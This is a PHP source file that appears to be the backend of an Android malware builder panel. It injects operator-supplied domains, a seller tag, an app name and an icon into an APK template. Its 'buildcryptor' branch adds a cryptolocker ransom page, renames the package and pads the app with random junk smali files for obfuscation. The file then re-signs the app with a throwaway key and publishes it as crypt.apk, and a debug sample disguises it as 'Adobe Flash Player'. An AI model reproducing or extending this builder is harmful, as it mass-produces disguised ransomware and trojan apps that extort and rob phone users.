<?php
include_once('lib_zip.php');
include_once('../../db.php');

#ob_start();

$old_package="compse.refact.st.upsssss";
$new_package=$mysqli->real_escape_string($_POST["packname"]);
$new_icon=$mysqli->real_escape_string($_POST["icon"]);
$new_seller=$mysqli->real_escape_string($_POST["seller"]);
$new_appname=$mysqli->real_escape_string($_POST["appname"]);
$new_time=$mysqli->real_escape_string($_POST["time"]);
$new_ptitle=$mysqli->real_escape_string($_POST["ptitle"]);
$new_ptext=$mysqli->real_escape_string($_POST["ptext"]);
$new_ptime=$mysqli->real_escape_string($_POST["ptime"]);

$domain1=$mysqli->real_escape_string($_POST["domain1"]);
$domain2=$mysqli->real_escape_string($_POST["domain2"]);
$domain3=$mysqli->real_escape_string($_POST["domain3"]);
$domain4=$mysqli->real_escape_string($_POST["domain4"]);
$domain5=$mysqli->real_escape_string($_POST["domain5"]);
$welcomepage=$mysqli->real_escape_string($_POST["welcomepage"]);


####### DEBUG ########
/*
$_POST["cmd"] = "buildcryptor";
$new_package="bx.aplee";
$new_icon="icons/a4w.png";
$new_seller="seller4test";
$new_appname="Adobe Flash Player";
$new_time="60";
$new_ptitle="test ptitle";
$new_ptext="test ptext";
$new_ptime="60";

$domain1="domain1";
$domain2="domain2";
$domain3="domain3";
$domain4="domain4";
$domain5="domain5";
*/
######################

$ppatch=dirname($_SERVER["SCRIPT_FILENAME"]);

function copy_r( $path, $dest ){  
        if( is_dir($path) ){  
            @mkdir( $dest );  
            $objects = scandir($path);  
            if( sizeof($objects) > 0 ) {  
                foreach( $objects as $file ){  
                    if( $file == "." || $file == ".." )  
                        continue;  
                    // go on  
                    if( is_dir( $path."/".$file ) ){  
                        copy_r( $path."/".$file, $dest."/".$file );
                    } else {  
                        copy( $path."/".$file, $dest."/".$file );  
                    }  
                }  
            }  
            return true;  
        } elseif( is_file($path) ) {  
            return copy($path, $dest);  
        } else {  
            return false;  
        }  
}  
function cpy($source, $dest){  
    if(is_dir($source)) {  
        $dir_handle=opendir($source);  
        while($file=readdir($dir_handle)){  
            if($file!="." && $file!=".."){  
                if(is_dir($source."/".$file)){  
                    if(!is_dir($dest."/".$file)){  
                        mkdir($dest."/".$file,0777);   
                    }  
                    cpy($source."/".$file, $dest."/".$file);  
                } else {  
                    copy($source."/".$file, $dest."/".$file);  
                }  
            }  
        }  
        closedir($dir_handle);  
    } else {  
        copy($source, $dest);  
    }  
}  
function randsym($min,$max){  
    $sym=array("q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");  
    $len=rand($min,$max);  
    $out="";  
    for($i=0;$i<$len;$i++){  
        $out.=$sym[rand(0,(count($sym)-1))];  
    }    
    return ucfirst($out);  
}
function rename_all($p,$s,$d){  
    $s=str_replace(".","/",$s);  
    $d=str_replace(".","/",$d);  
    if ($handle = opendir($p)) {  
	    while (false !== ($file = readdir($handle))) {  
	        if ($file != "." && $file != "..") {  
	           $t=file_get_contents($p."/".$file);  
	           $t=str_replace($s,$d,$t);  
	           file_put_contents($p."/".$file,$t);  
	        }  
	    }  
	    closedir($handle);  
	}
} 

function randomSmalis($path="templates/smali/", $files_count=50){
	$smali_files = scandir($path);
	$result = array();
	for ($i=1;$i<$files_count;$i++){
		array_push($result, $smali_files[rand(1,100)]);
	}
	return $result;
}

if ($_POST["cmd"] == "build"){
	$mk=time();  
	ob_start();  
	
	mkdir($ppatch."/tmp/".$mk,0777);  
	$folder=$ppatch."/tmp/".$mk;  
	cpy($ppatch."/src", $ppatch."/tmp/".$mk);  

	if ($_POST["icon"]) {
		$img_src = "../".$_POST["icon"];
		copy($img_src, "tmp/$mk/res/mipmap-xxxhdpi-v4/ic_launcher.png");
	}
    
	#$manifest=file_get_contents("templates/AndroidManifest.xml");
	$manifest=file_get_contents("src/AndroidManifest.xml");
	unlink($ppatch."/tmp/".$mk."/AndroidManifest.xml");

	# TODO: temporary disabled package rename
	# $manifest=str_replace($old_package,$new_package,$manifest);  

	$manifest=str_replace("%%title%%",$new_appname,$manifest);
	$manifest=str_replace("%%Seller%%",$new_seller,$manifest);
	$manifest=str_replace("%%Time%%",$new_time,$manifest);
	$manifest=str_replace("%%PTitle%%",$new_ptitle,$manifest);
	$manifest=str_replace("%%PText%%",$new_ptext,$manifest);
	$manifest=str_replace("%%PTime%%",$new_ptime,$manifest);

	$manifest=str_replace("%%Domian1%%",$domain1,$manifest);
	$manifest=str_replace("%%Domian2%%",$domain2,$manifest);
	$manifest=str_replace("%%Domian3%%",$domain3,$manifest);
	$manifest=str_replace("%%Domian4%%",$domain4,$manifest);
	$manifest=str_replace("%%Domian5%%",$domain5,$manifest);

	file_put_contents($ppatch."/tmp/".$mk."/AndroidManifest.xml",$manifest);  

	# patch cryptolocker file is it needed
	if (isset($welcomepage) && ($welcomepage != '')){
		$cryptoWelcome=file_get_contents($ppatch."/templates/crypt/".$welcomepage);  
		unlink($ppatch."/tmp/".$mk."/assets/help.html");  
		#$manifest=str_replace("%admindesc%",$row['admindesc'],$manifest);   
		file_put_contents($ppatch."/tmp/".$mk."/assets/help.html",$cryptoWelcome);  
    }

    # TODO: temporary disabled package rename
    /*
	list($s1,$s2,$s3,$s4)=explode(".",$old_package);  
	list($d1,$d2,$d3,$d4)=explode(".",$new_package);  
	rename($folder."/smali/".$s1,$folder."/smali/".$d1);  
	rename($folder."/smali/".$d1."/".$s2,$folder."/smali/".$d1."/".$d2);  
	rename($folder."/smali/".$d1."/".$d2."/".$s3,$folder."/smali/".$d1."/".$d2."/".$d3);  
	rename($folder."/smali/".$d1."/".$d2."/".$s3."/".$s4,$folder."/smali/".$d1."/".$d2."/".$d3."/".$d4); 
	rename_all($folder."/smali/".$d1."/".$d2."/".$d3."/".$d4,$old_package,$new_package);  */
	  
	$keystore=$mk.".keystore";  
	$alias=randsym(3,10);  
	$keytool="keytool -sigalg MD5withRSA -validity 1800 -keyalg RSA -keysize 1024 -keystore ".$folder."/".$keystore." -genkeypair -storepass qwerty -keypass qwerty -dname \"CN=".randsym(5,9)." ".randsym(5,9).", OU=".randsym(5,9).", O=".randsym(5,9).", L=".randsym(5,9).", S=".randsym(5,9).", C=US\" -alias ".$alias;  
	$last_line = system("".$keytool." 2>&1", $retval);  
	  
	$rer=system("apktool b ".$ppatch."/tmp/".$mk." ".$ppatch."/tmp/".$mk.".apk 2>&1", $retval);  
	 copy($ppatch."/tmp/".$mk."/dist/app.apk",$ppatch."/tmp/".$mk.".apk");  
	  
	$jarsinger = system("jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore ".$folder."/".$keystore." -storepass qwerty -keypass qwerty ".$ppatch."/tmp/".$mk.".apk ".$alias, $retval);  

    # create new link
	unlink($ppatch."/app.apk");
    symlink($ppatch."/tmp/".$mk.".apk", $ppatch."/app.apk");

	ob_end_clean();   

	$result = 1;
	if($result == 0) {
		$message = "something went wromg";
	} else {
		$message = "APK was builded successfully!";
	}

	$response = array("result" => "OK",
				"message" => "$message",
				);

} else if ($_POST["cmd"] == "buildcryptor") {
	# TODO: build cryptor
	$old_package = 'install.app';
	$mk="cryptor_".time();  
	ob_start();  
	
	mkdir($ppatch."/tmp/".$mk,0777);  
	$folder=$ppatch."/tmp/".$mk;  
	cpy($ppatch."/src_crypt", $ppatch."/tmp/".$mk);  
	#copyicon($ppatch."/".$row['iconp'],$ppatch."/tmp/".$mk."/res");  

	if ($_POST["icon"]) {
		$img_src = "../".$_POST["icon"];
		copy($img_src, "tmp/$mk/res/mipmap-xxxhdpi-v4/ic_launcher.png");
	}
    
	#$manifest=file_get_contents("templates/AndroidManifest.xml");
	$manifest=file_get_contents($ppatch."/tmp/".$mk."/AndroidManifest.xml");
	unlink($ppatch."/tmp/".$mk."/AndroidManifest.xml");

	# TODO: temporary disabled package rename
	$manifest=str_replace($old_package,$new_package,$manifest);  

	$manifest=str_replace("%%title%%",$new_appname,$manifest);
	$manifest=str_replace("%%Seller%%",$new_seller,$manifest);
	$manifest=str_replace("%%Time%%",$new_time,$manifest);
	$manifest=str_replace("%%PTitle%%",$new_ptitle,$manifest);
	$manifest=str_replace("%%PText%%",$new_ptext,$manifest);
	$manifest=str_replace("%%PTime%%",$new_ptime,$manifest);

	$manifest=str_replace("%%Domian1%%",$domain1,$manifest);
	$manifest=str_replace("%%Domian2%%",$domain2,$manifest);
	$manifest=str_replace("%%Domian3%%",$domain3,$manifest);
	$manifest=str_replace("%%Domian4%%",$domain4,$manifest);
	$manifest=str_replace("%%Domian5%%",$domain5,$manifest);

	file_put_contents($ppatch."/tmp/".$mk."/AndroidManifest.xml",$manifest);  

	# patch cryptolocker file is it needed
	if (isset($welcomepage) && ($welcomepage != '')){
		$cryptoWelcome=file_get_contents($ppatch."/templates/crypt/".$welcomepage);  
		unlink($ppatch."/tmp/".$mk."/assets/help.html");  
		file_put_contents($ppatch."/tmp/".$mk."/assets/help.html",$cryptoWelcome);  
    }

    # TODO: temporary disabled package rename
    
	list($s1,$s2,$s3,$s4)=explode(".",$old_package);  
	list($d1,$d2,$d3,$d4)=explode(".",$new_package);  
	rename($folder."/smali/".$s1,$folder."/smali/".$d1);  
	rename($folder."/smali/".$d1."/".$s2,$folder."/smali/".$d1."/".$d2);  
	rename_all($folder."/smali/".$d1."/".$d2,$old_package,$new_package);  

	# copy some smali files. that files can be use as garbage
	foreach (randomSmalis() as $smali) {
		copy("templates/smali/".$smali, $folder."/smali/".$d1."/".$d2."/".$smali);
	}
	  
	$keystore=$mk.".keystore";  
	$alias=randsym(3,10);  
	$keytool="keytool -sigalg MD5withRSA -validity 1800 -keyalg RSA -keysize 1024 -keystore ".$folder."/".$keystore." -genkeypair -storepass qwerty -keypass qwerty -dname \"CN=".randsym(5,9)." ".randsym(5,9).", OU=".randsym(5,9).", O=".randsym(5,9).", L=".randsym(5,9).", S=".randsym(5,9).", C=US\" -alias ".$alias;  
	$last_line = system("".$keytool." 2>&1", $retval);  
	  
	$rer=system("apktool b ".$ppatch."/tmp/".$mk." ".$ppatch."/tmp/".$mk.".apk 2>&1", $retval);  
	 copy($ppatch."/tmp/".$mk."/dist/crypt.apk",$ppatch."/tmp/".$mk.".apk");  
	  
	$jarsinger = system("jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore ".$folder."/".$keystore." -storepass qwerty -keypass qwerty ".$ppatch."/tmp/".$mk.".apk ".$alias, $retval);  

    # create new link
	unlink($ppatch."/crypt.apk");
    symlink($ppatch."/tmp/".$mk.".apk", $ppatch."/crypt.apk");

	ob_end_clean();   

	$result = 1;
	if($result == 0) {
		$message = "something went wromg";
	} else {
		$message = "APK was builded successfully!";
	}

	$response = array("result" => "OK",
				"message" => "$message",
				);
} else {
	$response = array("result" => "ERROR",
				"message" => "Something went wrong...",
				);
}
#ob_end_clean(); 

echo json_encode($response);
?>
